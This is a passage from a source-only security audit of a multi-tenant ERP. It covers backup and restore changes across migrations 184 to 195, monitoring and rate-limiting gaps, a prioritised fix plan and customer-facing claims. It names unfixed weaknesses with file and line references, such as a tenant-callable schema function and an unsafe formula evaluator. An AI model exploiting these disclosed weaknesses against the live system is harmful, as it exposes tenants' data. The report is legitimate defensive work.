**Fix.** Add error reporting (Sentry or Cloudflare's own), an uptime check on `/` and on `/api/v1`, and an alert when `backup_settings.last_error` is set or a scheduled job stops running.

#### 7.4 No rate limiting anywhere

**Severity: Medium.** Covered in 1.7, 4.5 and 4.6. Worth listing once as an operational gap: nothing anywhere limits the rate of anything, so any of the public endpoints is also an availability and cost risk.

#### 7.5 Dependency surface is small, and that is a real advantage

At runtime the app loads exactly one library (`supabase-js`) plus hCaptcha and Google Fonts. There is no build step, no `node_modules`, no lockfile to audit and no transitive dependency tree. Published tenant sites add Bootstrap 5.3.3 and Bootstrap Icons 1.11.3 from jsDelivr, both pinned.

The one defect is 4.3: the ERP's own library is unpinned and has no integrity hash.

#### 7.6 Testing is better than the stage of the product suggests

* `tests/static.test.js` runs structural invariants on every push, and each check is re-run against deliberately broken source to prove it can fail. Two checks were found to be wrong by that, which is exactly why it matters.
* `tests/live-audit.sh` is a real adversarial tenant-isolation suite: 73 probes, two tenants, four users including a limited member and a sales representative, plus structural assertions about RLS, search paths and policy shape.
* `tests/behaviour.sql` runs daily against live data.

The gap is coverage, not quality. There are no read-permission probes (1.1), no test that a tenant cannot run `backup_schema_sql` (1.3), and no test around the storage bucket beyond one file probe.

---

## 3. The owner's specific question: did anything recent change how a backup is taken or restored

Short answer: **taking a backup changed in one way (who is allowed to press the button), restoring changed in one way (a restored company now gets its own settings back), and a backup taken before these migrations still restores.** There is no format change, no version bump and no conflict. Two narrow cases are worth knowing about.

### What migrations 184 to 195 actually did to the backup path

**1. Who may take a backup changed (migration 194).**

`supabase/194-admin-functions-by-role.sql:32-35` rewrote the single permission check inside `backup_build`, `backup_log`, `backup_discard_restored` and `backup_fix_media_path` from `can_write_company(...)` to `can_manage_app(..., '{settings}')`.

Before 190, `can_write_company` meant owner, administrator or accountant. After 190 it meant any active member whose role can write anywhere, which would have let a sales representative download the whole company including salaries and bank details. 194 closed that. The error message changed too, from "Only an owner, administrator or accountant of this company can take its backup." to "Taking a backup of this company needs Manage in Settings on your role."

`tests/live-audit.sh:208` now proves a sales representative is refused, and `:284` proves an owner is not.

**2. Members on the old "admin" template briefly lost the button, and 195 gave it back.**

The global `admin` template read Manage for every app but View for Settings. Before 190 that Settings flag only shaped the screens. After 191 and 194 the database reads it, so those members lost backups, API keys, numbering and privacy tools overnight. `supabase/195-legacy-admin-keeps-settings.sql:12-16` sets that template to Manage for Settings. If anyone reported losing the Backups screen between those two migrations, that is why, and it is already fixed.

**3. Restoring now brings the company's own settings back (migration 187).**

`supabase/187-salaries-payable-and-restored-company-settings.sql:59-108` adds `backup_restore_company_settings`, and `:210` calls it from `backup_restore_doc` after every row is back. A restored company now recovers `companies.profile` (address, phones, logo, WPS codes, localisation), `print_settings`, `tax_id`, and every `*_account_id` and `*_journal_id` pointer remapped onto its restored account. Before 187 a restored company came back with only its name, legal name, currency and country.

The restore engine itself is otherwise byte-for-byte the version from `163b-restore-into-rebuild.sql`. The migration says so at `:23-25` and the code confirms it.

**4. Nothing else in 184 to 195 touches the backup path.**

* 184 rewrote two public booking functions.
* 185 added a unique index on POS voucher codes.
* 186 added three delete guards and a unique index on delivery note numbers.
* 188 and 189 changed website, privacy and Plot functions.
* 190 and 191 added role columns and write gates.
* 192 corrected stored transmittal prefixes.
* 193 narrowed the calendar feed.

### Does a backup taken before these migrations still restore

**Yes.** Four reasons, each checkable in the code:

1. **The format did not change.** `_meta.format` is still `1` (`supabase/173-backup-build-authorisation.sql:69`). The document is still `{tablename: [rows], _company: {...}, _meta: {...}}`.
2. **The table list is discovered at run time, not written down.** `backup_table_plan()` (`supabase/161-backups.sql:78-120`) finds every table with a `company_id`, then walks foreign keys outward. New tables and new columns are picked up automatically because rows are captured with `to_jsonb(t)`.
3. **The restore is driven by the file, not by the current schema.** `backup_restore_doc` iterates the keys of the payload (`supabase/187:145-160`). Columns that no longer exist make a row fail and be reported; columns that are new are simply left at their default.
4. **The new settings restore is defensive.** `backup_restore_company_settings` only copies a setting if the file actually has that key (`supabase/187:79`, `if p_co ? col.column_name`), and every assignment is wrapped in its own `exception when others then null`. An old file simply restores fewer settings.

**The two narrow cases:**

* **A pre-187 file leaves `salary_payable_account_id` empty.** Migration 187 added that column. A backup taken before it does not contain it, so a company restored from an old file comes back with no salaries-payable account. Payroll then refuses to post and asks you to choose the account in Settings, Companies. That is deliberate behaviour, not a failure, but it will look like one if nobody expects it.
* **A pre-185 or pre-186 file that contains duplicates will report failures.** Migration 185 added a unique index on `(company_id, lower(btrim(code)))` for `pos_vouchers`, and 186 added one on `(company_id, number)` for `delivery_notes`. Both were created only where no duplicates existed at the time. If an older backup contains two vouchers with the same code, or two delivery notes with the same number, those rows will not go in and will appear in the restore's `failures` block with the unique-violation message. Everything else restores. The fix is to rename the duplicate in the restored copy, or in the source data before taking the next backup.

### Do the new delete guards break anything

**No, and the migration handled it deliberately.**

`supabase/186-delete-guards-and-delivery-note-numbers.sql` adds `before delete` triggers on `stock_locations`, `warehouses` and `properties`. Each one begins with the same escape (`:40`, `:66`, `:92`):

```
if not exists (select 1 from public.companies c where c.id = old.company_id) then
  return old;   -- the company itself is being deleted
end if;
```

Two places in the backup path delete rows:

* The restore clears the rows that a new company's own setup triggers seeded, before inserting the file's rows (`supabase/187:163-168`). At that moment the new company has no stock moves and no property units, so every guard passes.
* `backup_discard_restored` (`supabase/161-backups.sql:471-490`) deletes the whole company row. The parent row is already gone when the cascade reaches the guarded tables, so the escape above lets it through. The migration's own header says exactly this at `:18-20`.

### Is anything missed by the backup

Yes, and it is worth writing down, because it is the difference between "restores the company" and "restores the system".

**Deliberately excluded** (`supabase/161-backups.sql:95` and `:111`): `app_secrets`, `platform_admins`, `backups`, `backup_settings`, `visits`, `audit_log`, and `companies` as a child.

Excluding secrets and platform tables is correct. Excluding `audit_log` is a decision worth revisiting (see finding 5.4): the customer's own copy of their data contains no history of who touched it.

**Excluded as a side effect, and this one matters more since migration 190.** The plan only reaches tables that have a `company_id`, or that hang off one by a foreign key. These do not:

* `roles` (keyed on `org_id`, `supabase/30-roles-permissions.sql:23-37`)
* `org_members`, `org_invites`, `orgs`, `profiles`

Before 190, `roles` was largely cosmetic. Since 190 and 191 it is what the database checks on every write. So a company restored into a rebuilt organisation comes back with its records intact and **no custom roles and no people**. You sign up, become the owner, restore, and then have to recreate every role and re-invite every member by hand. The README inside the zip does not mention this, and it should.

**Capped at four hops.** `supabase/161-backups.sql:99` `exit when d > 4`. Any table more than four foreign keys away from a `company_id` table is silently omitted. Whether such a table exists cannot be determined from the migration files alone.

**Confirm by** running `select * from public.backup_table_plan();` and comparing the result against `select relname from pg_class where relnamespace='public'::regnamespace and relkind='r'`. Anything in the second list and not the first, other than the six deliberate exclusions, is not in your backups.

**A table that fails to read is silently reported as empty.** `supabase/173-backup-build-authorisation.sql:44` and `:52` swallow every exception and set the row count to zero, and `:56` then only includes a table in the manifest `if n > 0`. So a table that errored looks identical to a table that was empty. There is no warning in the zip, in the README or on screen.

**Fix.** Collect the swallowed errors into a `_warnings` key in the document and show them on the Backups screen and in the README. A backup that quietly lost a table is worse than one that failed loudly.

### One security defect found in the backup code while answering this

`backup_schema_sql()` has no permission check and is callable by any signed-in user of any tenant. See finding 1.3. It is the function that writes `rebuild/schema.sql` into the zip (`js/app.js:15898`), so it is part of this same feature.

---

## 4. Prioritised plan

**Do first (days, and they close real holes)**

1. Fix `evalFormula` with the whitelist already used at `js/app.js:26976`. Finding 4.1. One line.
2. Add a caller check to `backup_schema_sql()`. Finding 1.3. One migration.
3. Add the security headers to `_headers`, starting with `frame-ancestors 'none'`, `nosniff`, HSTS and Referrer-Policy, then CSP in report-only, then enforcing. Finding 4.2.
4. Pin `supabase-js` to an exact version and add a subresource integrity hash, or vendor it. Finding 4.3.
5. Confirm whether point-in-time recovery is on for the Supabase project, and turn it on. Finding 7.1.
6. Restrict `send-invoice` recipients and add a send limit. Finding 4.6.
7. Add `encodeURIComponent` around every interpolated id in `functions/`. Finding 4.7.

**Do next (weeks, and they are what the first serious customer will test)**

8. Restrictive SELECT policies per app, generated the same way 191 generates write gates, plus a real read policy on `hr_employees`. Findings 1.1 and 1.2. This is the largest single piece of engineering on the list and the most important.
9. Add read probes for the sales representative and the limited member to `tests/live-audit.sh`, so 1.1 can never come back.
10. Extend the audit log: more tables, a jsonb diff, and an `audit_events` table for sign-in, export, backup and platform access. Findings 5.1 to 5.4.
11. Fix `media_visible` to deny by default. Finding 1.6.
12. Enable MFA (TOTP) with an org-level requirement. Finding 2.1a.
13. Stand up a staging Supabase project, move migrations into CI, add a `schema_migrations` table. Finding 7.2.
14. Add error reporting, uptime checks and an alert on failed scheduled jobs. Finding 7.3.
15. Rate limits at Cloudflare on `/api/v1/*`, the public RPCs and the email senders. Findings 1.7, 4.5, 4.6.
16. Put `roles` and `org_members` into the backup, or state clearly in the README what a rebuild does not carry. Section 3.
17. Surface swallowed table errors in the backup. Section 3.

**Do before the first enterprise contract (months)**

18. OIDC single sign-on per organisation. Finding 2.1b.
19. Session controls: shorter tokens, idle timeout, sign out everywhere, and automatic revocation when a member is suspended. Finding 2.3.
20. Platform-admin access: expiry, reason, logging, customer visibility. Finding 1.4.
21. Extend erasure to attachments. Finding 6.3.
22. Written key inventory and rotation schedule. Finding 3.2.
23. DPA, sub-processor list, self-hosted fonts, and a decision on EU residency. Finding 6.5.
24. Move published tenant sites off a `spacework.ai` subdomain and constrain the embed block. Finding 4.4.
25. Retention and deletion schedule for business records. Finding 6.6.

---

## 5. What we can honestly tell a customer today

Things that are true, verifiable and worth saying:

* Every table in the database enforces row level security, and we run an automated adversarial test that creates two tenants and tries to break out of one into the other. It currently runs 73 checks.
* No part of our system uses a master database key. Every server-side function acts either as the signed-in user or through a database function that checks permission itself.
* Your data is yours and it is portable. One button produces a zip with every record as plain JSON, every attachment, the complete database schema as SQL, and a copy of the application. Given an empty PostgreSQL database you can rebuild the whole system without us. We encourage you to test it once a quarter.
* We support GDPR subject access and erasure, both scoped to your company and tested across tenants. Erasure keeps the accounting records that tax law requires and records why.
* Visitor IP addresses are deleted after 90 days.
* Roles restrict what people can change, with 32 templates, approval limits and eight separation-of-duty rules enforced by the database.
* Sign-in is protected by hCaptcha and email verification.

Things we must say plainly rather than let a questionnaire discover:

* We do not support SAML or OIDC single sign-on yet, and we do not yet offer multi-factor authentication. Both are on the roadmap.
* Roles currently restrict what a person can **change**. They do not yet restrict everything a person can **read** through the API, apart from salary data, which is restricted at the database. We are closing that now.
* Our audit trail today covers financial documents and projects. It does not yet cover sign-in or permission changes. We are extending it.
* We do not yet offer a choice of data region, and we do not yet have a signed DPA or a published sub-processor list.
* We do not yet run a separate staging environment.

Things we should not say until they are true: that roles are enforced end to end, that we have a full audit trail, that we have a tested disaster recovery plan with a recovery time objective, or that hidden money values are hidden from the API.

---

*Prepared from source only. No code was changed and no system was probed. Every claim above cites a file and a line, and every item marked "confirm by" needs a live check before it is repeated to a customer.*
